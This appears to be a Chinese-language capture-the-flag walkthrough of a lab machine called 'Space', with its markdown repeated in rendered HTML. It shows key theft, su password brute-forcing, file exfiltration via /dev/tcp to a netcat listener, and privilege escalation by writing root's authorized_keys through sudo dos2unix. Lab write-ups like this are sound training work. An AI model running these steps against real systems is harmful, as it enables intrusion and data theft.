+───────────────────────────────────
+ code: d4t4s3c     version: v1.0.0
+───────────────────────────────────
+🎯 Username | root
+📖 Wordlist | pass.txt
+🔎 Status   | 199/199/100%/awmFURHhByAAlPJQKveg
+❗ Fuck!    | Password not found
+───────────────────────────────────
+#后面发现不是爆破root，是a3170账户
+andeli@Space:~$ ./suForce -u a3170 -w pass.txt
+            _____
+ ___ _   _ |  ___|__  _ __ ___ ___
+/ __| | | || |_ / _ \| '__/ __/ _ \
+\__ \ |_| ||  _| (_) | | | (_|  __/
+|___/\__,_||_|  \___/|_|  \___\___|
+───────────────────────────────────
+ code: d4t4s3c     version: v1.0.0
+───────────────────────────────────
+🎯 Username | a3170
+📖 Wordlist | pass.txt
+🔎 Status   | 111/199/55%/31703170317031703170
+💥 Password | 31703170317031703170
+───────────────────────────────────
+```
+
+测试使用`suForce`直接爆破`root、`andeli密码，把`user_data.json`文件取到本地留着备用
+
+```shell
+andeli@Space:~$ cat user_data.json > /dev/tcp/192.168.31.126/1234
+
+└─# nc -lvp 1234 > user_data.json
+listening on [any] 1234 ...
+connect to [192.168.31.126] from Space [192.168.31.229] 40782
+└─# ls user_data.json
+└─# cp user_data.json /mnt/c/Users/family/Desktop/
+
+```
+
+`/etc/passwd`发现用户`a3170`,搜索`user_data.json`有`a3170`的关键字，直接获得密码
+
+```shell
+andeli@Space:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+......
+andeli:x:1000:1000:,,,:/home/andeli:/bin/bash
+a3170:x:1001:1001:,,,:/home/a3170:/bin/bash
+andeli@Space:~$
+andeli@Space:~$ cat user_data.json | grep 3170
+    'password': '31703170317031703170',
+andeli@Space:~$ su - a3170
+Password:
+a3170@Space:~$ id
+uid=1001(a3170) gid=1001(a3170) groups=1001(a3170)
+a3170@Space:~$ cd
+a3170@Space:~$ ls
+a3170@Space:~$ sudo -l
+Matching Defaults entries for a3170 on Space:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User a3170 may run the following commands on Space:
+    (ALL) NOPASSWD: /usr/bin/dos2unix
+```
+
+拿到`a3170`的密码`a3170/31703170317031703170`，登录后可以`sudo`发运行 `/usr/bin/dos2unix`
+
+
+
+### 6.获得`root`权限
+
+`sudo`发现所有用户能够以 `root `身份运行 `/usr/bin/dos2unix`
+
+```shell
+a3170@Space:~$ sudo -l
+Matching Defaults entries for a3170 on Space:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User a3170 may run the following commands on Space:
+    (ALL) NOPASSWD: /usr/bin/dos2unix
+```
+
+查表，`dos2unix`可以写文件，现成的提权方案
+
+```shell
+#`dos2unix`提权
+LFILE1=file_to_read
+LFILE2=file_to_write
+dos2unix -f -n '$LFILE1' '$LFILE2'
+```
+
+直接写个公钥
+
+```shell
+a3170@Space:~$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/a3170/.ssh/id_rsa):
+Created directory '/home/a3170/.ssh'.
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /home/a3170/.ssh/id_rsa
+Your public key has been saved in /home/a3170/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:knoi0lcBR1t7RVuovtT4PYTdEIUbvpxx9n83Pyh87DA a3170@Space
+The key's randomart image is:
++---[RSA 3072]----+
+|    ..o .  .o..o.|
+|     o o . ..o+  |
+|      o . .... + |
+|       o ..   = o|
+|      + S. o + O.|
+| .   o .  + o * o|
+|. o + .  ..E.o. .|
+| . o o    .o++oo+|
+|            +. .B|
++----[SHA256]-----+
+a3170@Space:~$ cd .ssh
+a3170@Space:~/.ssh$ ls
+id_rsa  id_rsa.pub
+a3170@Space:~/.ssh$ sudo dos2unix -f -n 'id_rsa.pub' '/root/.ssh/authorized_keys'
+dos2unix: converting file id_rsa.pub to file /root/.ssh/authorized_keys in Unix format...
+a3170@Space:~/.ssh$
+a3170@Space:~/.ssh$ ssh root@127.0.0.1
+Last login: Sat Jun 21 20:27:39 2025 from 192.168.3.94
+root@Space:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+##### 拿到`root.txt`
+
+```shell
+root@Space:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Space:~# cd
+root@Space:~# ls
+root.txt
+root@Space:~# cat root.txt
+flag{root-f9f8c2ea-4f00-11f0-9724-e7b0f6215b99}
+root@Space:~# cat /home/andeli/user.txt
+flag{user-cea97ada-4f00-11f0-af69-57bd20d8ec7c}
+```
+
+。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://pingsag3.github.io/post/qun-zhu-ba-ji-%20Space%2020250623.html">
+<meta property="og:image" content="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg">
+<title>群主靶机 Space 20250623</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">群主靶机 Space 20250623</h1>
+<div class="title-right">
+    <a href="https://pingsag3.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/pingsag3/pingsag3.github.io/issues/8" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h3>1. 基本信息</h3>
+<pre class="notranslate"><code class="notranslate">靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=
+</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️
+知识点：信息收集，<span class="pl-s"><span class="pl-pds">`</span>私钥<span class="pl-pds">`</span></span>利用，<span class="pl-s"><span class="pl-pds">`</span>suForce<span class="pl-pds">`</span></span>密码爆破，<span class="pl-s"><span class="pl-pds">`</span>dos2unix<span class="pl-pds">`</span></span>提权，写<span class="pl-s"><span class="pl-pds">`</span>公钥<span class="pl-pds">`</span></span></pre></div>
+<h3>2. 信息收集</h3>
+<h5>Nmap</h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
+192.168.31.229  08:00:27:c5:06:9a       PCS Systemtechnik GmbH
+└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.31.229</span>
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 21:18 CST
+Nmap scan report <span class="pl-k">for</span> Space (192.168.31.229)
+Host is up (0.0014s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+<span class="pl-k">|</span> ssh-hostkey:
+<span class="pl-k">|</span>   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+<span class="pl-k">|</span>   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+<span class="pl-k">|</span>_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
+<span class="pl-k">|</span>_http-server-header: Apache/2.4.62 (Debian)
+<span class="pl-k">|</span> http-cookie-flags:
+<span class="pl-k">|</span>   /:
+<span class="pl-k">|</span>     PHPSESSID:
+<span class="pl-k">|</span>_      httponly flag not <span class="pl-c1">set</span>
+<span class="pl-k">|</span>_http-title: Typing Challenge
+MAC Address: 08:00:27:C5:06:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</pre></div>
+<p>开放了<code class="notranslate">22、80</code>端口,先看看<code class="notranslate">80</code>有啥东西</p>
+<h3>3.目录扫描</h3>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html</span>
+└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP  -x 403 -e txt,php,html</span>
+[21:18:51] Starting:
+[21:18:59] 302 -    0B  - /check.php  -<span class="pl-k">&gt;</span>  index.php
+[21:19:03] 200 -    3KB - /index.php
+[21:19:03] 200 -    3KB - /index.php/login/
+
+<span class="pl-c"><span class="pl-c">#</span>Challenge Complete!</span>
+Congratulations<span class="pl-k">!</span> You have successfully completed the challenge.
+Your reward: /var/www/html/andeli.id_rsa</pre></div>
+<p>习惯性扫目录没啥明显有用信息，直接访问主页是打字挑战页面，根据提示复制5句话后获得提示信息：网站根目录<code class="notranslate">/var/www/html/andeli.id_rsa</code>下有私钥</p>
+<p>把私钥取下来</p>
+<pre class="notranslate"><code class="notranslate">└─# curl http://$IP/andeli.id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<h3>4.获得<code class="notranslate">andeli</code>权限</h3>
+<h5><code class="notranslate">私钥</code>利用</h5>
+<pre class="notranslate"><code class="notranslate">#通过私钥解出公钥
+└─#ssh-keygen -y -f &lt;私钥&gt;
+#私钥登陆
+#ssh &lt;私钥账户名&gt;@ip -i &lt;私钥&gt;
+</code></pre>
+<p>通过私钥解出公钥，再通过私钥登陆账户<code class="notranslate">andeli</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> echo '&lt;私钥&gt;' &gt; id</span>
+└─<span class="pl-c"><span class="pl-c">#</span> chmod 600 id</span>
+└─<span class="pl-c"><span class="pl-c">#</span> ssh-keygen -y -f id</span>
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnfC0nbu5Bq1wz718/yBkJPuKhVtKYUzkxZln7hln8AmzB+4j2d3MAO8mCtWAKPb/+8c7seVrRXhLucdxysUtW4fHPG1xNeIhMqaj5LQ3S4G7Q12TMXC+ZM+pHi0b+nUbp+C31+az22rD8DYRh/kyT9wO/07CEaV1QCtBkP0N39nLtmdEaEFUeb8dPFvAJp3Sfg6v348RTMlvlTD4YbwDc/QnXbwFSUjGPgzb8jvr2rfFIbgS5P2SoAlcJ3EC8jNno4h8Qj3IWhE9sMsR773nLnOhCkfphqvkuqIr5f5ifFJxZbAJ7evgFAkKIdPsuMgrQcflhQyQVyvu31C83K3O0k+valVARP1R2SI3bu7YMLKBXDnLWrSs/d8KwRkMJQnFx+Of09nDkhHOolw7UE8gVpw+m+/+NYjUMDWyZ3T7Gv8BRYQEvjz3YZnqExHi40uW9raI+hOzhx9m2F5xdZ3QiYLJZxJ7pLmkU1Zn4L+7tN3uXjrGGU3pPD83afW9Cu6k= andeli@Space
+└─<span class="pl-c"><span class="pl-c">#</span> ssh andeli@$IP -i id</span>
+The authenticity of host <span class="pl-s"><span class="pl-pds">'</span>192.168.31.229 (192.168.31.229)<span class="pl-pds">'</span></span> can<span class="pl-s"><span class="pl-pds">'</span>t be established.</span>
+<span class="pl-s">ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.</span>
+<span class="pl-s">This host key is known by the following other names/addresses:</span>
+<span class="pl-s">    ~/.ssh/known_hosts:36: [hashed name]</span>
+<span class="pl-s">    (7 additional names omitted)</span>
+<span class="pl-s">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="pl-s">Warning: Permanently added <span class="pl-pds">'</span></span>192.168.31.229<span class="pl-s"><span class="pl-pds">'</span> (ED25519) to the list of known hosts.</span>
+<span class="pl-s">Linux Space 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
+<span class="pl-s"></span>
+<span class="pl-s">The programs included with the Debian GNU/Linux system are free software;</span>
+<span class="pl-s">the exact distribution terms for each program are described in the</span>
+<span class="pl-s">individual files in /usr/share/doc/*/copyright.</span>
+<span class="pl-s"></span>
+<span class="pl-s">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
+<span class="pl-s">permitted by applicable law.</span>
+<span class="pl-s">andeli@Space:~$ id</span>
+<span class="pl-s">uid=1000(andeli) gid=1000(andeli) groups=1000(andeli)</span></pre></div>
+<p>直接<code class="notranslate">私钥</code>去登陆获得<code class="notranslate">user.txt</code></p>
+<h5>拿到<code class="notranslate">user.txt</code></h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate">andeli@Space:<span class="pl-k">~</span>$ id
+uid=1000(andeli) gid=1000(andeli) groups=1000(andeli)
+andeli@Space:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span>
+andeli@Space:<span class="pl-k">~</span>$ ls
+user_data.json  user.txt
+andeli@Space:<span class="pl-k">~</span>$ cat user.txt
+flag{user-cea97ada-4f00-11f0-af69-57bd20d8ec7c}</pre></div>
+<h3>5.获得<code class="notranslate">a3170</code>权限</h3>
+<p>获取<code class="notranslate">andeli</code>权限后发现<code class="notranslate">home</code>目录下有<code class="notranslate">user_data.json</code>文件，里面是账户密码信息，使用本机自带的<code class="notranslate">jq</code>提取密码字典</p>
+<h5>提取密码字典</h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>使用jq提取密码字典</span>
+andeli@Space:<span class="pl-k">~</span>$ jq --version
+jq-1.6
+andeli@Space:<span class="pl-k">~</span>$ jq -r <span class="pl-s"><span class="pl-pds">'</span>.[].password<span class="pl-pds">'</span></span> user_data.json <span class="pl-k">&gt;</span> pass.txt
+andeli@Space:<span class="pl-k">~</span>$ cat pass.txt
+6fz9Y2qPWfwYqlIZns9Y
+9RqH4tBKCjh58K1wbtCd
+<span class="pl-c"><span class="pl-c">#</span>也可以使用 grep + awk（无jq时）</span>
+andeli@Space:<span class="pl-k">~</span>$ grep <span class="pl-s"><span class="pl-pds">'</span>"password":<span class="pl-pds">'</span></span> user_data.json <span class="pl-k">|</span> awk -F <span class="pl-s"><span class="pl-pds">'</span>"<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $4}<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> pass1.txt
+andeli@Space:<span class="pl-k">~</span>$ md5sum pass.txt
+8aebc48147dbc2af5f430105532fe36a  pass.txt
+andeli@Space:<span class="pl-k">~</span>$ md5sum pass1.txt
+8aebc48147dbc2af5f430105532fe36a  pass1.txt</pre></div>
+<h5><code class="notranslate">suForce</code>密码爆破</h5>
+<pre class="notranslate"><code class="notranslate">## Download suForce
+cd /dev/shm
+wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/suForce"
+chmod +x suForce
+## Download Wordlist (Optional)
+wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/techyou.txt"
+wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/top12000.txt"
+## Usage
+chmod +x suForce
+./suForce -u &lt;USER&gt; -w &lt;WORDLIST&gt;
+</code></pre>
+<p>尝试使用<code class="notranslate">suForce</code>直接爆破<code class="notranslate">root</code>密码</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali└─<span class="pl-c"><span class="pl-c">#</span> python3 -m http.server 80</span>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.31.229 - - [23/Jun/2025 21:50:42] <span class="pl-s"><span class="pl-pds">"</span>GET /suForce HTTP/1.1<span class="pl-pds">"</span></span> 200 -
+
+andeli@Space:<span class="pl-k">~</span>$ busybox wget 192.168.31.126/suForce
+Connecting to 192.168.31.126 (192.168.31.126:80)
+suForce              100% <span class="pl-k">|</span><span class="pl-k">************************************************************************</span><span class="pl-k">|</span>  2430  0:00:00 ETA
+andeli@Space:<span class="pl-k">~</span>$ ls
+pass.txt  suForce  user_data.json  user.txt
+andeli@Space:<span class="pl-k">~</span>$ chmod +x suForce
+andeli@Space:<span class="pl-k">~</span>$ ./suForce -u root -w pass.txt
+            _____
+ ___ _   _ <span class="pl-k">|</span>  ___<span class="pl-k">|</span>__  _ __ ___ ___
+/ __<span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">||</span> <span class="pl-k">|</span>_ / _ <span class="pl-cce">\|</span> <span class="pl-s"><span class="pl-pds">'</span>__/ __/ _ \</span>
+<span class="pl-s">\__ \ |_| ||  _| (_) | | | (_|  __/</span>
+<span class="pl-s">|___/\__,_||_|  \___/|_|  \___\___|</span>
+<span class="pl-s">───────────────────────────────────</span>
+<span class="pl-s"> code: d4t4s3c     version: v1.0.0</span>
+<span class="pl-s">───────────────────────────────────</span>
+<span class="pl-s">🎯 Username | root</span>
+<span class="pl-s">📖 Wordlist | pass.txt</span>
+<span class="pl-s">🔎 Status   | 199/199/100%/awmFURHhByAAlPJQKveg</span>
+<span class="pl-s">❗ Fuck!    | Password not found</span>
+<span class="pl-s">───────────────────────────────────</span>
+<span class="pl-s">#后面发现不是爆破root，是a3170账户</span>
+<span class="pl-s">andeli@Space:~$ ./suForce -u a3170 -w pass.txt</span>
+<span class="pl-s">            _____</span>
+<span class="pl-s"> ___ _   _ |  ___|__  _ __ ___ ___</span>
+<span class="pl-s">/ __| | | || |_ / _ \| <span class="pl-pds">'</span></span>__/ __/ _ \
+<span class="pl-cce">\_</span>_ <span class="pl-cce">\ </span><span class="pl-k">|</span>_<span class="pl-k">|</span> <span class="pl-k">||</span>  _<span class="pl-k">|</span> (_) <span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">|</span> (_<span class="pl-k">|</span>  __/
+<span class="pl-k">|</span>___/<span class="pl-cce">\_</span>_,_<span class="pl-k">||</span>_<span class="pl-k">|</span>  <span class="pl-cce">\_</span>__/<span class="pl-k">|</span>_<span class="pl-k">|</span>  <span class="pl-cce">\_</span>__<span class="pl-cce">\_</span>__<span class="pl-k">|</span>
+───────────────────────────────────
+ code: d4t4s3c     version: v1.0.0
+───────────────────────────────────
+🎯 Username <span class="pl-k">|</span> a3170
+📖 Wordlist <span class="pl-k">|</span> pass.txt
+🔎 Status   <span class="pl-k">|</span> 111/199/55%/31703170317031703170
+💥 Password <span class="pl-k">|</span> 31703170317031703170
+───────────────────────────────────</pre></div>
+<p>测试使用<code class="notranslate">suForce</code>直接爆破<code class="notranslate">root、</code>andeli密码，把<code class="notranslate">user_data.json</code>文件取到本地留着备用</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">andeli@Space:<span class="pl-k">~</span>$ cat user_data.json <span class="pl-k">&gt;</span> /dev/tcp/192.168.31.126/1234
+
+└─<span class="pl-c"><span class="pl-c">#</span> nc -lvp 1234 &gt; user_data.json</span>
+listening on [any] 1234 ...
+connect to [192.168.31.126] from Space [192.168.31.229] 40782
+└─<span class="pl-c"><span class="pl-c">#</span> ls user_data.json</span>
+└─<span class="pl-c"><span class="pl-c">#</span> cp user_data.json /mnt/c/Users/family/Desktop/</span>
+</pre></div>
+<p><code class="notranslate">/etc/passwd</code>发现用户<code class="notranslate">a3170</code>,搜索<code class="notranslate">user_data.json</code>有<code class="notranslate">a3170</code>的关键字，直接获得密码</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">andeli@Space:<span class="pl-k">~</span>$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+......
+andeli:x:1000:1000:,,,:/home/andeli:/bin/bash
+a3170:x:1001:1001:,,,:/home/a3170:/bin/bash
+andeli@Space:<span class="pl-k">~</span>$
+andeli@Space:<span class="pl-k">~</span>$ cat user_data.json <span class="pl-k">|</span> grep 3170
+    <span class="pl-s"><span class="pl-pds">"</span>password<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>31703170317031703170<span class="pl-pds">"</span></span>,
+andeli@Space:<span class="pl-k">~</span>$ su - a3170
+Password:
+a3170@Space:<span class="pl-k">~</span>$ id
+uid=1001(a3170) gid=1001(a3170) groups=1001(a3170)
+a3170@Space:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span>
+a3170@Space:<span class="pl-k">~</span>$ ls
+a3170@Space:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> a3170 on Space:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+
+User a3170 may run the following commands on Space:
+    (ALL) NOPASSWD: /usr/bin/dos2unix</pre></div>
+<p>拿到<code class="notranslate">a3170</code>的密码<code class="notranslate">a3170/31703170317031703170</code>，登录后可以<code class="notranslate">sudo</code>发运行 <code class="notranslate">/usr/bin/dos2unix</code></p>
+<h3>6.获得<code class="notranslate">root</code>权限</h3>
+<p><code class="notranslate">sudo</code>发现所有用户能够以 <code class="notranslate">root </code>身份运行 <code class="notranslate">/usr/bin/dos2unix</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">a3170@Space:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> a3170 on Space:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+
+User a3170 may run the following commands on Space:
+    (ALL) NOPASSWD: /usr/bin/dos2unix</pre></div>
+<p>查表，<code class="notranslate">dos2unix</code>可以写文件，现成的提权方案</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>`dos2unix`提权</span>
+LFILE1=file_to_read
+LFILE2=file_to_write
+dos2unix -f -n <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$LFILE1</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$LFILE2</span><span class="pl-pds">"</span></span></pre></div>
+<p>直接写个公钥</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">a3170@Space:<span class="pl-k">~</span>$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file <span class="pl-k">in</span> which to save the key (/home/a3170/.ssh/id_rsa):
+Created directory <span class="pl-s"><span class="pl-pds">'</span>/home/a3170/.ssh<span class="pl-pds">'</span></span>.
+Enter passphrase (empty <span class="pl-k">for</span> no passphrase):
+Enter same passphrase again:
+Your identification has been saved <span class="pl-k">in</span> /home/a3170/.ssh/id_rsa
+Your public key has been saved <span class="pl-k">in</span> /home/a3170/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:knoi0lcBR1t7RVuovtT4PYTdEIUbvpxx9n83Pyh87DA a3170@Space
+The key<span class="pl-s"><span class="pl-pds">'</span>s randomart image is:</span>
+<span class="pl-s">+---[RSA 3072]----+</span>
+<span class="pl-s">|    ..o .  .o..o.|</span>
+<span class="pl-s">|     o o . ..o+  |</span>
+<span class="pl-s">|      o . .... + |</span>
